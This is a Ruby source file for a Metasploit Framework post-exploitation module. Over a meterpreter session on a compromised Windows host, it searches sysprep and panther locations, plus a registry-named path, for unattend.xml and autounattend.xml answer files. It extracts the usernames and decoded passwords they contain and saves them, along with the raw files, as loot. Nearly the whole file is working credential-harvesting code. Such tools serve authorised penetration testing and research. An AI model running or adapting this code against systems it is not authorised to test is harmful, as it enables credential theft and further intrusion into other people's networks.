##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/file'
require 'rex/parser/unattend'
require 'rexml/document'

class Metasploit3 < Msf::Post

  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Unattended Answer File Enumeration',
      'Description'   => %q{
          This module will check the file system for a copy of unattend.xml and/or
        autounattend.xml found in Windows Vista, or newer Windows systems.  And then
        extract sensitive information such as usernames and decoded passwords.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          'Sean Verity <veritysr1980[at]gmail.com>',
          'sinn3r',
          'Ben Campbell <eat_meatballs[at]hotmail.co.uk>'
        ],
      'References'    =>
        [
          ['URL', 'http://technet.microsoft.com/en-us/library/ff715801'],
          ['URL', 'http://technet.microsoft.com/en-us/library/cc749415(v=ws.10).aspx'],
          ['URL', 'http://technet.microsoft.com/en-us/library/c026170e-40ef-4191-98dd-0b9835bfa580']
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptBool.new('GETALL', [true, 'Collect all unattend.xml that are found', true])
      ], self.class)
  end


  #
  # Determine if unattend.xml exists or not
  #
  def unattend_exists?(xml_path)
    x = session.fs.file.stat(xml_path) rescue nil
    return !x.nil?
  end


  #
  # Read and parse the XML file
  #
  def load_unattend(xml_path)
    print_status("Reading #{xml_path}")
    f = session.fs.file.new(xml_path)
    raw = ""
    until f.eof?
      raw << f.read
    end

    begin
      xml = REXML::Document.new(raw)
    rescue REXML::ParseException => e
      print_error("Invalid XML format")
      vprint_line(e.message)
      return nil, raw
    end

    return xml, raw
  end

  #
  # Save Rex tables separately
  #
  def save_cred_tables(cred_table)
    t = cred_table
    vprint_line("\n#{t.to_s}\n")
    p = store_loot('windows.unattended.creds', 'text/plain', session, t.to_csv, t.header, t.header)
    print_status("#{t.header} saved as: #{p}")
  end


  #
  # Save the raw version of unattend.xml
  #
  def save_raw(xmlpath, data)
    return if data.empty?
    fname = ::File.basename(xmlpath)
    p = store_loot('windows.unattended.raw', 'text/plain', session, data)
    print_status("Raw version of #{fname} saved as: #{p}")
  end


  #
  # If we spot a path for the answer file, we should check it out too
  #
  def get_registry_unattend_path
    # HKLM\System\Setup!UnattendFile
    begin
      key = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, 'SYSTEM')
      fname = key.query_value('Setup!UnattendFile').data
      return fname
    rescue Rex::Post::Meterpreter::RequestError
      return ''
    end
  end


  #
  # Initialize all 7 possible paths for the answer file
  #
  def init_paths
    drive = session.fs.file.expand_path("%SystemDrive%")

    files =
      [
        'unattend.xml',
        'autounattend.xml'
      ]

    target_paths =
      [
        "#{drive}\\",
        "#{drive}\\Windows\\System32\\sysprep\\",
        "#{drive}\\Windows\\panther\\",
        "#{drive}\\Windows\\Panther\Unattend\\",
        "#{drive}\\Windows\\System32\\"
      ]

    paths = []
    target_paths.each do |p|
      files.each do |f|
        paths << "#{p}#{f}"
      end
    end

    # If there is one for registry, we add it to the list too
    reg_path = get_registry_unattend_path
    paths << reg_path if not reg_path.empty?

    return paths
  end


  def run
    init_paths.each do |xml_path|
      # If unattend.xml doesn't exist, move on to the next one
      if not unattend_exists?(xml_path)
        vprint_error("#{xml_path} not found")
        next
      end

      xml, raw = load_unattend(xml_path)
      save_raw(xml_path, raw)

      # XML failed to parse, will not go on from here
      return if not xml

      results = Rex::Parser::Unattend.parse(xml)
      table = Rex::Parser::Unattend.create_table(results)
      table.print unless table.nil?
      print_line

      # Save the data
      save_cred_tables(table) if not table.nil?

      return if not datastore['GETALL']
    end
  end

end
